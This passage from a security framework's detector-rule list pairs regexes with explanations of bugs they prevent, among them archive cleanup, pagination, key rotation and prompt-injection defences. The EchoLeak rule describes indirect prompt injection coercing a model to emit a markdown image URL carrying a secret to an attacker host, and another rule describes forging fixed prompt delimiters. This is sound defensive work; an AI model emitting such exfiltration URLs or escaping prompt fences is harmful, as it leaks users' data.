    reason: "Codex P1 on v0.12.7 PR #158 — archive-read.extract used renameSync to atomically place each decompressed entry at its canonical destination + tracked written[].path for catch-block cleanup. When the destination directory was non-empty, the rename silently overwrote operator files; on extract abort, the cleanup deleted them. Fix: refuse upfront if destination path exists, force operators to use a fresh / empty subtree. Detector locks the shape: any extract code that tracks resolvedPath for catch-block cleanup MUST carry a `destination-exists` refusal in the same file.",
  },

  {
    // Codex P1 on v0.12.13 PR #164 — listKeys against a paginated
    // object-store backend dropped every key past the first page
    // because the call sent only one client.list() and ignored
    // the `truncated` / `continuationToken` contract. Detector
    // locks the shape: any lib/ call to `client.list(...)` paired
    // with `truncated` consumption MUST also walk the
    // continuationToken loop, OR the call site must carry an
    // `allow:list-without-pagination` marker explaining why
    // single-page is sufficient (typically: the caller already
    // bounds the prefix or already passes a maxResults that's
    // known to be larger than the universe).
    id: "object-store-list-without-pagination",
    primitive: "object-store list calls in lib/ MUST walk truncated / continuationToken pages — single-shot list silently truncates at the backend's page cap (1000 by default). The runtime symptom is silent data loss in listBundles / deleteBundle. Either follow the pagination loop or carry the `allow:list-without-pagination` marker with the bound reason.",
    regex: /\bclient\.list\s*\(/,
    requires: /continuationToken|truncated|allow:list-without-pagination/,
    skipCommentLines: true,
    allowlist: [
      // backup/index.js IS the runtime pagination site (walks the
      // loop with the runaway-cap defence). Allowlisted because
      // the inline `client.list` calls there are inside the
      // walker itself; the detector would false-positive on the
      // call inside the do-while.
      "lib/backup/index.js",
    ],
    reason: "Codex P1 on v0.12.13 PR #164 — objectStoreAdapter.listKeys called client.list once and never followed the truncated/continuationToken pagination contract. The fix walks the loop with a PAGINATION_CAP safety net. Detector locks the shape so a future caller of client.list can't silently drop pagination.",
  },

  {
    id: "storage-deletefile-drops-versionid-threading",
    primitive: "b.storage.deleteFile MUST thread { versionId, bypassGovernanceRetention } to backend.delete — a bare picked.backend.delete(key) reverts to the WORM-blind unversioned delete that only writes a delete-marker on an S3 Object-Lock bucket, masking that the data version survives (a fake erasure for GDPR Art. 17 / crypto-shred).",
    scanScope: "lib",
    regex: /function deleteFile\s*\(\s*key\s*,\s*opts\s*\)(?:(?!\n\})[\s\S]){0,800}?\.backend\.delete\s*\(\s*key\s*\)/,
    allowlist: [],
    reason: "v0.15.10 #88 — deleteFile threads versionId + bypassGovernanceRetention to backend.delete so b.storage.deleteFile(key, { versionId }) reaches the S3 versioned-delete (real erasure on an Object-Lock bucket); a versioned delete of a retained version is refused (throws), never a silent delete-marker success. A bare picked.backend.delete(key) is the pre-fix WORM-blind shape. Anchored on deleteFile(key, opts) + tempered on \\n} (deleteFile's own close) so it can't bleed into a sibling function; storage.js is the only deleteFile(key, opts) site. Empty allowlist — the bare form is the regression. The behavioral guard is test/integration/object-store-worm-lock.test.js (framework-API WORM proof on live MinIO); this is the cheap always-on structural backstop.",
  },

  {
    id: "object-store-backend-deletekey-ignores-versionid-contract",
    primitive: "every object-store backend deleteKey MUST accept (key, opts) and handle opts.versionId — sigv4 threads it to the versioned delete, every other backend throws VERSIONID_UNSUPPORTED. A single-param deleteKey(key) silently ignores a versionId an erasure workflow passed and issues a plain delete, the WORM-blind footgun #88 closed.",
    scanScope: "lib",
    regex: /function deleteKey\s*\(\s*key\s*\)/,
    allowlist: [],
    reason: "v0.15.10 #88 — the b.storage.deleteFile -> backend.delete({ versionId }) contract reaches whichever backend is routed (sigv4 / azure-blob / gcs / local / http-put). A backend that defines deleteKey(key) with no opts param drops the versionId silently (the original http-put miss Codex P2 caught: it forwarded versionId to a deleteKey that ignored it, issuing a plain DELETE while an erasure workflow believed it targeted a version). All five backends now take (key, opts); the single-param shape is the regression. Empty allowlist — a new object-store backend must take (key, opts) and either thread versionId (S3 versioned delete) or throw VERSIONID_UNSUPPORTED.",
  },

  {
    // Codex P1A on v0.12.12 PR #163 — "on-request" placement
    // semantics collapsed into "always" when shouldEmit didn't
    // gate on an explicit `opts.requested` signal. Detector locks
    // the contract: any compliance-disclosure primitive in
    // lib/ai-disclosure.js with a placement-mode dispatch MUST
    // gate the "on-request" branch on an explicit opt rather than
    // unconditionally returning true. The pattern is narrow
    // (file-scoped to ai-disclosure.js) because the bug shape was
    // specific to the Art. 50 placement enum.
    id: "ai-disclosure-on-request-without-requested-gate",
    primitive: "in lib/ai-disclosure.js, placement === \"on-request\" branches must gate on an explicit opt (e.g. opts.requested === true) so the disclosure doesn't fire on every call. Without the gate, on-request collapses into always-on semantics and the operator's three placement modes become two.",
    regex: /placement\s*===\s*["']on-request["']/,
    requires: /requested|allow:ai-disclosure-on-request-without-requested-gate/,
    skipCommentLines: true,
    allowlist: [],
    reason: "Codex P1A on v0.12.12 PR #163 — ai-disclosure.chatbot's on-request placement returned shouldEmit=true unconditionally, breaking the three-mode placement contract. Detector locks the static shape so a future placement primitive in ai-disclosure.js can't regress.",
  },

  {
    // b.ai.output.sanitize neutralizes the EchoLeak markdown-image /
    // link zero-click exfiltration class (CVE-2025-32711) by gating
    // every extracted URL through b.safeUrl.parse (scheme + credential)
    // AND b.ssrfGuard.classify (internal / loopback / link-local /
    // cloud-metadata IP-range). The bug class this locks: a future edit
    // that extracts a URL from model output in lib/ai-output.js (a
    // markdown image / link / reference URL or an HTML src / href) but
    // drops the SSRF gate would re-open auto-fetch to an internal /
    // metadata host. The file-scoped invariant: ai-output.js MUST
    // continue to compose ssrfGuard.classify. (safe-url alone is NOT
    // sufficient — it does protocol-allowlist + userinfo + IDN, but
    // does NOT classify 169.254.169.254 / RFC1918 / loopback.) If
    // ai-output.js ever stops gating URLs (e.g. the primitive is
    // removed), carry an `allow:ai-output-url-ssrf-gate` marker with the
    // reason.
    id: "ai-output-markdown-url-without-ssrf-gate",
    primitive: "lib/ai-output.js sanitize() MUST gate every URL extracted from model output (markdown image / link / reference + HTML src/href) through BOTH b.safeUrl.parse (scheme + credential refusal) AND b.ssrfGuard.classify (internal / loopback / link-local / cloud-metadata IP-range refusal) — the EchoLeak zero-click exfiltration class (CVE-2025-32711). safe-url alone does not classify private / metadata IPs; ssrfGuard is the IP-range layer. Dropping the ssrfGuard composition re-opens auto-fetch to an attacker / metadata host.",
    // File-scoped via a content shape unique to ai-output.js: its
    // markdown-image URL extractor variable (MD_IMAGE_RE). When that
    // extractor is present, the file MUST also reference
    // ssrfGuard.classify so the IP-range gate can't be silently
    // dropped. Other lib files that carry a `![` literal (e.g.
    // ai-input.js's markdown-injection pattern) don't define
    // MD_IMAGE_RE, so the detector is precise to the output gate.
    regex:    /\bMD_IMAGE_RE\b/,
    requires: /ssrfGuard\.classify|allow:ai-output-url-ssrf-gate/,
    skipCommentLines: true,
    allowlist: [],
    reason: "b.ai.output.sanitize (v0.14.11) defends OWASP LLM05:2025 improper output handling. The EchoLeak markdown-image exfiltration class (CVE-2025-32711, Microsoft 365 Copilot, CVSS 9.3) coerces the model via indirect prompt injection to emit ![](https://attacker-or-internal-host/<secret>); the client auto-fetches it zero-click. The defense gates every output URL through safeUrl.parse + ssrfGuard.classify so internal / cloud-metadata targets are neutralized. Detector locks the composition: a future edit to ai-output.js that handles markdown-image URLs without ssrfGuard.classify trips the gate so the SSRF layer can't be silently dropped.",
  },


  {
    // b.ai.input.classifyWithSources (v0.14.11) applies a TIER-RELATIVE
    // injection threshold to retrieval-augmented (RAG) sources: untrusted
    // / internal sources escalate on a single severity-2 or any
    // severity-3 signal, where the direct prompt keeps classify()'s
    // 2-severity-2 threshold. The bug class this locks: a handler in lib/
    // that maps b.ai.input.classify over a sources array on its own loses
    // that tier-relative threshold (and the worst-of aggregate +
    // tainted-source bookkeeping), re-opening the indirect prompt-
    // injection gap (OWASP LLM01:2025) that retrieved data must be
    // classified MORE strictly than operator input. The fix is to compose
    // classifyWithSources, which owns the per-tier escalation. A file that
    // legitimately maps classify over elements is classifyWithSources's
    // own module (it names the symbol) — cleared by the `requires`
    // companion. The lookbehind excludes a `function classify(` decl that
    // happens to follow an unrelated .map() in the same file.
    id: "rag-source-classify-without-classifywithsources",
    primitive: "to classify retrieval-augmented (RAG) sources alongside a prompt, compose b.ai.input.classifyWithSources — do NOT map b.ai.input.classify over a sources array by hand. classifyWithSources applies a tier-relative threshold (untrusted / internal sources escalate on a single severity-2 / any severity-3, vs classify's 2-severity-2 baseline) and computes the worst-of aggregate + tainted-source set. Mapping classify directly loses the stricter retrieved-data threshold (OWASP LLM01:2025 indirect prompt injection; CVE-2025-32711 EchoLeak).",
    regex: /\.map\(\s*(?:function\s*\([^)]*\)\s*\{|\([^)]*\)\s*=>|[A-Za-z_$][\w$]*\s*=>)(?:(?!\n\s{0,2}\})[\s\S]){0,600}?(?<!function\s)\bclassify\s*\(/,
    requires: /classifyWithSources|allow:rag-source-classify-without-classifywithsources/,
    skipCommentLines: true,
    allowlist: [],
    reason: "b.ai.input.classifyWithSources (v0.14.11) defends OWASP LLM01:2025 indirect prompt injection — retrieved RAG context is an attacker-influenceable channel (CVE-2025-32711 EchoLeak, CVSS 9.3; NIST AI 600-1 information-integrity). Mapping b.ai.input.classify over sources by hand applies the operator-prompt threshold to retrieved data, which is too permissive: a single severity-2 fragment in an untrusted document should escalate. Detector locks the composition so a future handler that re-rolls the per-source loop without classifyWithSources trips the gate. No pre-existing lib site maps classify over an array; allowlist is empty.",
  },

  {
    // b.ai.prompt.template (v0.14.11) fences untrusted context / user
    // segments with a PER-RENDER crypto-nonce delimiter
    // (<<UNTRUSTED:role:NONCE>> ... <<END:role:NONCE>>) and strips any
    // forged occurrence of the active nonce before wrapping, so untrusted
    // content cannot close the boundary and break into the control plane
    // (spotlighting / datamarking, Microsoft 2024; NIST AI 100-2e2025;
    // OWASP LLM01:2025 indirect prompt injection). The bug class this
    // locks: a prompt-assembly site in lib/ that wraps untrusted content
    // in a FIXED / guessable literal fence (<user_input> ... </user_input>,
    // </context>, [DATA]) the attacker can simply emit to terminate. The
    // regex fires on a fence LITERAL used as a wrapper — concatenated with
    // a variable ("<user_input>" + x  /  x + "</user_input>") or carrying a
    // template interpolation (`<user_input>${...}`). It deliberately does
    // NOT match a bare `###` heading (markdown), and clears any file that
    // mints a `nonce` / calls generateBytes (the correct shape).
    // ai-prompt.js's own ROLE_CONTROL_TOKENS literals are an escape-target
    // allowlist, never concatenated as fences, so they don't trip this.
    id: "ai-prompt-template-fixed-delimiter",
    primitive: "prompt-assembly that wraps untrusted (context / user) content MUST fence it with a per-render high-entropy delimiter (compose b.ai.prompt.template / b.crypto.generateBytes), NOT a fixed / guessable literal fence (<user_input>, </context>, [DATA]). A static fence is forgeable: the model output emits the close-tag verbatim and breaks into the control plane (OWASP LLM01:2025 indirect prompt injection; spotlighting/datamarking, Microsoft 2024).",
    regex: /(?:`[^`]*(?:<\/?(?:user_input|context|user|data|untrusted)>|\[\/?(?:DATA|USER|CONTEXT|UNTRUSTED)\])[^`]*\$\{|["'](?:<\/?(?:user_input|context|user|data|untrusted)>|\[\/?(?:DATA|USER|CONTEXT|UNTRUSTED)\])["']\s*\+|\+\s*["'](?:<\/?(?:user_input|context|user|data|untrusted)>|\[\/?(?:DATA|USER|CONTEXT|UNTRUSTED)\])["'])/i,
    requires: /\bnonce\b|generateBytes|allow:ai-prompt-template-fixed-delimiter/,
    skipCommentLines: true,
    allowlist: [],
    reason: "b.ai.prompt.template (v0.14.11) defends OWASP LLM01:2025 indirect prompt injection by fencing untrusted segments with a per-render crypto nonce the content can't forge (spotlighting/datamarking, Microsoft 2024; NIST AI 100-2e2025). A fixed literal fence (<user_input>...</user_input>, [DATA]...[/DATA]) is forgeable — the model emits the close-tag and escapes the data plane. Detector locks the discipline: any lib prompt-assembly that wraps content in a static fence (literal + variable, or template interpolation) without a per-render nonce trips the gate. ai-prompt.js mints a nonce + calls generateBytes (cleared by requires) and its ROLE_CONTROL_TOKENS literals are an escape-target list, not a wrapper. No pre-existing lib site uses a fixed prompt fence; allowlist is empty.",
  },

  {
    // CVE-2025-52556 / CWE-347 (improper signature verification) re-open
    // guard for the C2PA sigTst2 timestamp countersignature. The ONLY
    // correct timestamp-verification path is b.tsa.verifyToken, which does
    // the full RFC 3161 §2.4.2/§2.3 check: the CMS signature over the
    // signed attributes + the messageDigest recompute + a critical, sole
    // id-kp-timeStamping EKU — NOT a chain-only shortcut. A bespoke cert-
    // chain walk (checkIssued / X509Certificate(...).verify) on the
    // timestamp token in place of tsa.verifyToken accepts a backdated /
    // forged token whose CMS signature was never checked. Scoped to the
    // timestamp context (sigTst2 / tstToken / tstContainer /
    // CounterSignature) so the CAWG identity-assertion x509 chain check
    // (_verifyIdentityX509Chain), which legitimately walks its own chain,
    // is not flagged.
    id: "c2pa-timestamp-bespoke-chain-check",
    primitive: "verify a C2PA sigTst2 timestamp countersignature through b.tsa.verifyToken (full RFC 3161 CMS-signature + messageDigest + critical-sole-EKU check) — never a bespoke cert-chain-only walk on the timestamp token",
    regex: /(?:sigTst2|tstToken|tstContainer|CounterSignature)(?:(?!\n\}|\bverifyToken\s*\()[\s\S]){0,2000}?(?:\.checkIssued\s*\(|new\s+(?:nodeCrypto\.)?X509Certificate(?:(?!\n\})[\s\S]){0,400}?\.verify\s*\()/,
    skipCommentLines: true,
    allowlist: [],
    reason: "CVE-2025-52556 (RFC 3161 timestamp-validation bypass) / CWE-347 (improper signature verification). The C2PA sigTst2 (RFC 9921) timestamp countersignature in lib/content-credentials.js MUST be verified through b.tsa.verifyToken, which performs the full RFC 3161 §2.4.2/§2.3 check (CMS signature over the signed attributes, messageDigest recompute, critical + sole id-kp-timeStamping EKU). A bespoke cert-chain-only check (checkIssued / X509Certificate(...).verify) on the timestamp token accepts a token whose CMS signature was never verified — a backdating / key-compromise forgery. The detector fires when a chain-walk appears near a timestamp token; route through tsa.verifyToken instead. Scoped to the timestamp context so the CAWG identity x509 chain (_verifyIdentityX509Chain) is not affected.",
  },

  {
    // v0.14.11 — the GPAI Code-of-Practice adherence declaration
    // (b.compliance.aiAct.gpai.declareAdherence) MUST ship inside a
    // signed CycloneDX 1.6 ML-BOM envelope via b.ai.modelManifest
    // .build/sign (ML-DSA-87 over canonical-JSON-1785), which carries
    // the signature-substitution defense in verify. A bare-JSON
    // adherence emitter that writes the `ai-act:gpai-cop-adherence`
    // property bag into a transport WITHOUT routing through
    // modelManifest().sign is a tamper-evidence regression: the
    // obligation set + per-commitment evidence hashes could be edited
    // after the fact (CWE-345 / CWE-347). Any lib/ file that emits the
    // adherence property MUST compose the signed envelope OR carry an
    // `allow:gpai-adherence-declaration-must-be-signed` marker with the
    // reason signing is bypassed.
    id: "gpai-adherence-declaration-must-be-signed",
    primitive: "any lib/ code that emits the `ai-act:gpai-cop-adherence` property bag MUST route through b.ai.modelManifest.sign (the signed CycloneDX 1.6 ML-BOM envelope) so the GPAI Code-of-Practice declaration is tamper-evident — never serialize a bare adherence JSON to a transport. Bypass requires an explicit `allow:gpai-adherence-declaration-must-be-signed` marker.",
    regex: /["']ai-act:gpai-cop-adherence["']/,
    requires: /modelManifest\(\)\.sign|allow:gpai-adherence-declaration-must-be-signed/,
    skipCommentLines: true,
    allowlist: [],
    reason: "v0.14.11 — b.compliance.aiAct.gpai.declareAdherence binds the EU AI Act Art. 53/55 GPAI Code-of-Practice adherence declaration (derived obligation set + per-commitment SHA3-512 evidence hashes) into an ML-DSA-87-signed CycloneDX 1.6 ML-BOM via b.ai.modelManifest.build/sign. The signed envelope is the ONLY emission path on the happy path; verify re-canonicalizes and never trusts embedded signed-bytes (CVE-2025-29774 / CVE-2025-29775 xml-crypto signature-substitution class). This detector locks the contract so a future emitter can't ship a bare unsigned adherence JSON whose obligation set could be silently downgraded after signing."
  },

  {
    // A framework module that registers a cryptoField {aad:true} table on an
    // OPERATOR-SUPPLIED store via the lazy-require form cryptoField().registerTable
    // (agent-idempotency / agent-orchestrator / agent-tenant) seals AAD cells
    // OUTSIDE db.enc. The in-tree b.vaultRotate.rotate pipeline only walks tables
    // inside db.enc, so it CANNOT reach these stores — after a vault-key rotation
    // every such cell is orphaned under the retired root (CWE-320). Every such
    // module MUST export an AAD_ROTATION descriptor whose reseal hook rotates the
    // operator store out-of-band. The detector locks the contract so a new
    // external-store {aad:true} table can't silently re-introduce the orphan.
    // The db.init-reachable tables use the direct cryptoField.registerTable form
    // (no parens) and are rotated by the in-tree pipeline, so they don't match.
    id: "aad-external-store-table-without-rotation",
    primitive: "every lib/ module that calls cryptoField().registerTable(...) (the lazy-require form, used only for {aad:true} tables sealed on an operator-supplied store outside db.enc) MUST export an AAD_ROTATION descriptor { table, rowIdField, schemaVersion, backend: \"external\", reseal } whose reseal({ store, oldRootJson, newRootJson }) re-seals every persisted AAD cell old-root -> new-root via vaultAad.resealRoot, rebuilding AAD via cryptoField._aadParts. Without it, a vault-key rotation orphans the store's ciphertext under the retired root.",
    regex: /cryptoField\(\)\.registerTable/,
    requires: /AAD_ROTATION|allow:aad-external-store-table-without-rotation/,
    skipCommentLines: true,
    allowlist: [],
    reason: "External-store {aad:true} tables (agent-idempotency 'agent_idempotency', agent-orchestrator 'agent_orchestrator_registry', agent-tenant 'agent_tenant_registry') seal AAD cells on an operator-supplied backend the in-tree b.vaultRotate.rotate pipeline can't reach. Each now exports AAD_ROTATION.reseal so an operator rotates them out-of-band, composing vaultAad.resealRoot + cryptoField._aadParts (one source of truth for the AAD tuple). The detector ensures a future external-store {aad:true} table can't ship without a rotation hook, which would silently orphan its ciphertext under the old vault root after a rotation (CWE-320 cryptographic-key-management failure).",
  },

  {
  // A module that declares a root-derived sealed-cell PREFIX FAMILY
  // (a `<name>-vN:` ciphertext prefix whose per-cell key is derived
  // from the vault master root — SHA3-512 of b.vault.getKeysJson())
  // MUST also ship an AAD_ROTATION reseal descriptor so a vault-key
  // rotation can re-seal every prior cell old-root -> new-root. Without
  // the reseal path a keypair rotation orphans every cell (decryptable
  // under neither root). The bug class this locks: a future module adds
  // a `var X_PREFIX = \"foo-v1:\";` sealed-cell family + an explicit-root
  // derivation but forgets the reseal hook, silently re-breaking the
  // \"rotation = re-seal\" promise. agent-tenant.js (tnt-v1:) and
  // agent-snapshot.js (snap-sealed-v1:) both define the prefix AND export
  // AAD_ROTATION, so they are cleared by the `requires` companion. vault-
  // aad.js / vault/rotate.js are the reseal SUBSTRATE, not a prefix
  // family, so they don't carry the literal and don't trip.
  id: "root-prefix-family-without-reseal",
  primitive: "a module that declares a root-derived sealed-cell prefix family (var <NAME>_PREFIX = \"<token>-vN:\" whose per-cell key derives from the vault root via SHA3-512 of b.vault.getKeysJson) MUST also export an AAD_ROTATION descriptor with a reseal({ store, oldRootJson, newRootJson }) hook (composing vaultAad.resealRoot for vault.aad: cells and the explicit-root derived key on both sides for the prefix-family cells). Otherwise a vault-key rotation orphans every prior cell — decryptable under neither root — silently breaking the rotation = re-seal contract.",
  regex: /\bvar\s+[A-Z][A-Z0-9_]*_PREFIX\s*=\s*"[a-z0-9-]+-v\d+:"/,
  requires: /AAD_ROTATION|allow:root-prefix-family-without-reseal/,
  skipCommentLines: true,
  allowlist: [],
  reason: "v0.14.x — the two root-derived prefix families (b.agent.tenant tnt-v1: + b.agent.snapshot snap-sealed-v1:) derive their per-cell XChaCha20-Poly1305 key from SHA3-512(b.vault.getKeysJson()); rotating the vault keypair changes the root, so every prior cell must be re-sealed old-root -> new-root via the module's AAD_ROTATION reseal hook (the migration is NOT automatic on read). Detector locks the discipline: any new lib module that declares a `<name>-vN:` sealed-cell prefix family without an AAD_ROTATION reseal path trips the gate. Both current matches export AAD_ROTATION (cleared by requires); allowlist is empty — a future prefix family with no reseal path is a real defect, not allowlist material.",
},

  {
    id: "wrapped-aad-seal-needs-reseal-path",
    primitive: "a lib module that AAD-seals a value (vault.aad: ciphertext) and wraps it behind its own string-prefix constant before persisting MUST export an AAD_ROTATION descriptor whose reseal() strips the wrapper, resealRoots the inner blob old->new root under the rebuilt AAD, and re-applies the wrapper - a `db.enc` scan for the bare \"vault.aad:\" prefix can't detect or re-key a wrapper-prefixed cell, so vault-key rotation would silently strand it. See lib/agent-snapshot.js (SEALED_PREFIX + AAD_ROTATION). Bypass requires an `allow:wrapped-aad-seal-needs-reseal-path` marker naming why the wrapped values are out of rotation scope.",
    regex: /=\s*"[^"]*sealed[^"]*:"\s*;/i,
    requires: /AAD_ROTATION|allow:wrapped-aad-seal-needs-reseal-path/,
    skipCommentLines: true,
    allowlist: [
      // cache.js wraps a PLAIN vault().seal ("vault:" envelope), not an
      // AAD-root-bound "vault.aad:" blob - re-keyed by the whole-vault
      // rotation, not the AAD reseal pipeline. Not in AAD_ROTATION scope.
      "lib/cache.js",
    ],
    reason: "v0.14.12 b.agent.snapshot.reseal - the snapshot envelope is AAD-sealed then wrapped behind SEALED_PREFIX (\"snap-sealed-v1:\") and written to an operator backend, so a db.enc scan for the bare \"vault.aad:\" prefix can neither detect nor re-key it during a vault-key rotation. The module exports AAD_ROTATION { table, rowIdField, schemaVersion, backend:\"external\", reseal } so the rotation pipeline drives the re-key (resealRoot old->new root under the rebuilt _snapshotAad, prefix re-applied). Detector locks the invariant: any future module that wraps an AAD-sealed value behind its own prefix constant must ship the same reseal path so wrapper-hidden ciphertext can't escape vault-key rotation.",
  },

  { id: "archive-tenant-rewrap-must-compose-rewrapTenant", primitive: "b.archive.rewrapTenant", scanScope: "lib", regex: /archive-wrap\|tenant\||derivedKey(?:WithRoot)?\([^)]*["']archive-wrap["']/, allowlist: ["lib/archive-wrap.js", "lib/agent-tenant.js"], reason: "v0.14.12 — recipient: \"tenant\" archive blobs are keyed off the vault root (b.agent.tenant.derivedKey(tenantId, \"archive-wrap\")) and sealed under the tenant-bound AAD literal \"archive-wrap|tenant|<id>\". The vault rotation pipeline (b.vaultRotate.rotate) does NOT walk operator-placed blobs (files / object-storage / backups), so re-wrapping them old-root->new-root MUST compose b.archive.rewrapTenant — never re-derive the archive-wrap tenant key or rebuild the tenant AAD inline, which would (a) skip the explicit-root straddle the live singleton can't do and (b) risk drifting the AAD/derivation away from the single source. Data-loss class: CWE-325 (missing required cryptographic step) / CWE-665 (improper initialization of the new-root key). Owner lib/archive-wrap.js holds both the AAD construction and the explicit-root derivation; lib/agent-tenant.js is the home of the derivedKey derivation + carries the canonical \"archive-wrap\" purpose only in its @primitive docstring examples (stripped by the comment-skip preprocessor). Any OTHER lib file matching this shape is re-implementing tenant-blob crypto and must route through b.archive.rewrapTenant instead." },

  { id: "no-phantom-not-yet-supported-throw", primitive: "a primitive must not advertise a capability in @module/@intro/@card prose and then throw an unimplemented stub with no re-open condition — implement it or remove the advertisement (overdue-broken-promise class)", scanScope: "lib", skipCommentLines: true, regex: /not yet supported|operator demand TBD|not[ -]supported in v1\b/i, allowlist: [], reason: "v0.14.13 — mail-srs (the phantom srs1Rewrite fn) and oid4vp (DCQL null path-segment) each advertised a capability in their @module/@intro/@card and then threw a bare stub ('not yet supported', 'operator demand TBD', 'not supported in v1') with no written re-open condition. A defer is only complete WITH a condition (feedback_defer_is_a_v1_decision); legitimate defers read 're-opens when X' / 'defer-with-condition', never a bare 'not yet supported'. Both stubs are now implemented (SRS1 double-forward + DCQL array-wildcard); this detector (throw/code strings only — comments skipped) keeps the bare-defer phrasing from re-entering lib/." },

  { id: "dcql-null-path-must-recurse-not-refuse", primitive: "DCQL claims-path-pointer null segment selects all elements of the array at that depth (OpenID4VP 1.0 §7.1.1) — recurse over array elements, never throw 'not supported'", scanScope: "lib", regex: /null[- ]?path[- ]?segment[- ]?not[- ]?supported|null path segment \(any-element\) not supported/i, allowlist: [], reason: "v0.14.13 — lib/auth/oid4vp.js _resolvePath once refused null path segments with AuthError(\"auth-oid4vp/null-path-segment-not-supported\") while the module @card advertised DCQL. A null segment is the spec-mandated array wildcard (OpenID4VP 1.0 §7.1.1: select all elements of the currently selected array); refusing it under-discloses a legitimate presentation (CWE-863 incorrect authorization). _walkPath now recurses over array elements with existence semantics (null on a non-array node is a clean non-match, not a throw — holder credential data, rule §5 defensive-reader tier). Detector ensures the throw-stub phrasing cannot return; the testNoStaleDefers version-promise detector does not catch it because its regex requires a NN.NN version and the stub said single-digit \"in v1\"." },

  { id: "safe-archive-extract-to-memory-no-disk-write", primitive: "b.safeArchive.extractToMemory must stay disk-free — it composes the readers' extractEntries() async generators and yields { name, bytes, size } in memory; the disk path is b.safeArchive.extract", scanScope: "lib", regex: /async function\* extractToMemory[\s\S]{0,2000}?\b(writeFileSync|renameSync|mkdirSync|appendFileSync|createWriteStream)\b/, allowlist: [], reason: "v0.14.13 — extractToMemory is the read-only / serverless-FS counterpart to extract(): it MUST NOT touch disk, it yields decompressed entry bytes from the readers' extractEntries() async generators. A writeFileSync / renameSync / mkdirSync / createWriteStream inside the generator body means the no-disk-write contract regressed (the exact failure the serverless / read-only-FS use case forbids). The disk extract() is the only writer; the inverse must-compose-the-orchestrator direction is already covered by archive-substrate-bypass / safe-archive-extract-bypass. Empty allowlist — a disk write on this path is a real defect, not allowlist material." },

  { id: "safe-archive-no-phantom-encryptpacked-envelope", primitive: "b.safeArchive must not sniff or advertise a b.crypto.encryptPacked / EPACK archive envelope — encryptPacked writes a 1-byte XChaCha20 format header, not a magic prefix, and no framework primitive produces an EPACK-wrapped archive; only the real BAWRP / BAWPP wrap envelopes are sniffed + auto-unwrapped", scanScope: "lib", regex: /\bEPACK\b|encryptPacked-wrapped (archives|envelopes) (are )?auto-unwrapped|format:\s*"encryptPacked"/, allowlist: [], reason: "v0.14.13 — safe-archive's _sniffMagic carried a phantom MAGIC_ENCPACKED=\"EPACK\" branch returning { format: \"encryptPacked\" } and the @intro + format-unsupported messages advertised encryptPacked-wrapped archives as auto-unwrapped, but b.crypto.encryptPacked writes a 1-byte format header (0x02 XChaCha20-Poly1305), NOT an \"EPACK\" magic — so nothing ever produced or matched it, and b.archive.sniffEnvelope (the sibling sniffer) only knows BAWRP / BAWPP. Codex P2 on PR #294 surfaced the sniff vs unwrap vs advertisement drift; the phantom format + advertisement were removed. This detector keeps the dead EPACK magic and the false auto-unwrap advertisement from creeping back into lib/." },

  { id: "consent-grant-recognized-purpose-unenforced", primitive: "minting a consent row with a recognized gated purpose (educational-only) must go through b.consent — the PURPOSES vocabulary + grant() lawful-basis gate — not a hardcoded purpose literal that records the value without enforcing its FERPA/SOPIPA lawful-basis constraint", scanScope: "lib", regex: /purpose:\s*["']educational-only["']/, requires: /recognizedPurpose|PURPOSES/, allowlist: ["lib/consent.js"], reason: "v0.14.14 — F5.1 educational-only is a GATED consent purpose: b.consent.grant() refuses a legitimate_interests lawful basis for it (FERPA 34 CFR 99.31 school-official exception / California SOPIPA Cal. B&P 22584). A lib file that mints a consent row with a hardcoded purpose:\"educational-only\" literal WITHOUT composing the PURPOSES vocabulary re-introduces the broken-promise shape where the value is recorded but its lawful-basis constraint is never enforced (CWE-285 improper authorization). consent.js owns + enforces PURPOSES and is allowlisted; any other lib file matching the literal must route through b.consent. Must-compose detector for the gated-purpose primitive per feedback_new_safe_primitive_ships_with_must_compose_detector." },

  { id: "consent-purposes-null-proto", primitive: "the recognized-purpose map (PURPOSES) must be a null-prototype object so an operator-supplied free-form purpose colliding with an Object.prototype member (toString / constructor / __proto__) resolves to undefined, not the prototype value", scanScope: "lib", regex: /var PURPOSES\s*=\s*Object\.freeze\(/, requires: /Object\.create\(null\)/, allowlist: [], reason: "v0.14.14 Codex P2 on PR #295 (CWE-1321) — recognizedPurpose(name) + grant() index PURPOSES[purpose] with an operator-controlled value; a plain-prototype map returns Object.prototype.toString (truthy) for purpose \"toString\", breaking the null-for-free-form contract and entering grant()'s recognized branch for a value listPurposes() never exposes. PURPOSES is now Object.freeze(Object.assign(Object.create(null), {...})) so every unrecognized key resolves to undefined. Detector requires the null-prototype declaration so the lookup can't silently revert to a plain object." },

  { id: "connect-entry-point-port-must-compose-optionalPort", primitive: "a connection entry point reading opts.port / opts.kePort / opts.ntpPort with a `|| <default>` fallback must first validate it via validateOpts.optionalPort (or, where a permanent typed error is needed, the equivalent numericBounds.isPositiveFiniteInt(opts.port) + 65535 cap) — an unvalidated opts.port || N silently accepts a string / negative / NaN / out-of-range port", scanScope: "lib", regex: /\bopts\.(?:port|kePort|ntpPort)\s*\|\|/, requires: /validateOpts\.optionalPort\(|isPositiveFiniteInt\(opts\.port\)|["']optional-port["']/, allowlist: [], reason: "v0.14.15 — the connection entry points (mail.smtpTransport, ntpCheck.querySingle, dns.useDnsOverTls, nts.performKeHandshake / querySingle / query, redis.create) read opts.port || <default>, silently coercing a string / negative / NaN / >65535 port; rule §5 says config-time entry points THROW so the operator catches the typo at boot. Each now composes validateOpts.optionalPort (RFC 6335 §6 [1,65535]; allowZero for the app.listen ephemeral bind) — or, where a MailError-permanent typed error is needed, the same numericBounds.isPositiveFiniteInt + 65535 rule inline. The requires-companion clears a file once it validates; a new entry point reading opts.port || N without composing the validator trips the gate." },

  { id: "deny-response-guards-headers-sent", primitive: "the deny-path writer in lib/middleware/deny-response.js must guard the default res.writeHead(ctx.status, ...) on res.headersSent (not res.writableEnded alone) — a wrapping consumer that already sent headers without flipping writableEnded would otherwise re-enter writeHead and throw \"headers already sent\", turning a refusal into a 500", scanScope: "lib", regex: /res\.writeHead\s*\(\s*ctx\.status\b/, requires: /res\.headersSent/, allowlist: [], reason: "denyResponse's pre-writeHead terminal guard once checked only res.writableEnded; a consumer that committed headers via res.setHeader/writeHead without setting writableEnded slipped past it and re-entered the default writeHead(ctx.status), throwing on already-sent headers. The guard now reads `res.writableEnded || res.headersSent || !_isFn(res.writeHead)`. File-scoped via the writeHead(ctx.status anchor unique to deny-response.js; the requires-companion fails if a future edit drops the headersSent term. Empty allowlist — losing the headersSent guard is a real defect." },

